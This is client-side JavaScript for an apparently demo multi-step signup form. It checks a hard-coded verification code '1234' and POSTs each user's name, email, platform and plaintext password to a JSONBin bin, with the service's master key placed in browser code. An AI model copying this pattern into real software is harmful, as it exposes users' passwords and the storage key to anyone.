        window.addEventListener('load', () => {
      setTimeout(() => {
        document.getElementById('loader').classList.add('hidden');
        setupEnterKey(); // activate Enter key bindings after load
      }, 1000);
    });

        function nextStep(nextId) {
      const visibleStep = document.querySelector('form > div:not(.hidden)');
      const input = visibleStep.querySelector('input');
      if (!input.value) {
        input.reportValidity();
        return;
      }
      const steps = ['step-name', 'step-email', 'step-verification', 'step-platform', 'step-password'];
      steps.forEach(step => document.getElementById(step).classList.add('hidden'));
      document.getElementById('step-' + nextId).classList.remove('hidden');
      focusFirstInput(); // move focus to next input
    }


    function sendVerification() {
      const email = document.getElementById('email');
      if (!email.value) {
        email.reportValidity();
        return;
      }
      alert("Verification code sent to " + email.value);
      nextStep('verification');
    }

    function verifyCode() {
      const code = document.getElementById('verificationCode').value;
      if (code === "") {
        alert("Please enter the verification code.");
        return;
      }
      if (code !== "1234") {
        alert("Incorrect code. Try '1234' to proceed for demo.");
        return;
      }
      nextStep('platform');
    }

        function focusFirstInput() {
      const visibleStep = document.querySelector('form > div:not(.hidden)');
      const input = visibleStep.querySelector('input');
      if (input) {
        input.focus();
      }
    }

    // Attach Enter key behavior dynamically
    function setupEnterKey() {
      const inputs = document.querySelectorAll('#signupForm input');
      inputs.forEach(input => {
        input.addEventListener('keydown', function (e) {
          if (e.key === 'Enter') {
            e.preventDefault();
            const stepId = this.closest('div').id;
            if (stepId === 'step-name') nextStep('email');
            else if (stepId === 'step-email') sendVerification();
            else if (stepId === 'step-verification') verifyCode();
            else if (stepId === 'step-platform') nextStep('password');
            else if (stepId === 'step-password') {
              document.getElementById('signupForm').requestSubmit();
            }
          }
        });
      });
    }


    function togglePassword() {
      const passwordInput = document.getElementById("password");
      const toggleBtn = passwordInput.nextElementSibling;
      if (passwordInput.type === "password") {
        passwordInput.type = "text";
        toggleBtn.textContent = "Hide";
      } else {
        passwordInput.type = "password";
        toggleBtn.textContent = "Show";
      }
    }

    // Form Submit Handling 

        // 🔐 JSONBin Configuration
        const JSONBIN_API_KEY = 'YOUR_API_KEY_HERE';
        const JSONBIN_BIN_ID = 'YOUR_BIN_ID_HERE';
        const JSONBIN_URL = `https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`;

        // ⚡ Submit Handler
        document.getElementById('signupForm').addEventListener('submit', function (e) {
        e.preventDefault();

        // Collect form values
        const name = document.getElementById('name').value;
        const email = document.getElementById('email').value;
        const platform = document.getElementById('platform').value;
        const password = document.getElementById('password').value;

        // Simple validation
        if (!name || !email || !platform || !password) {
            alert("Please fill all fields.");
            return;
        }

        const userData = {
            name: name,
            email: email,
            platform: platform,
            password: password
        };

        // Send data to JSONBin
        fetch(JSONBIN_URL, {
            method: 'POST',
            headers: {
            'Content-Type': 'application/json',
            'X-Master-Key': JSONBIN_API_KEY
            },
            body: JSON.stringify(userData)
        })
            .then(response => response.json())
            .then(data => {
            console.log(data);
            alert("✅ Account created successfully! Redirecting to your inbox...");
            setTimeout(() => {
                window.location.href = 'app.html';
            }, 800);
            })
            .catch(error => {
            console.error('Error:', error);
            alert("Something went wrong while creating your account.");
            });
        });
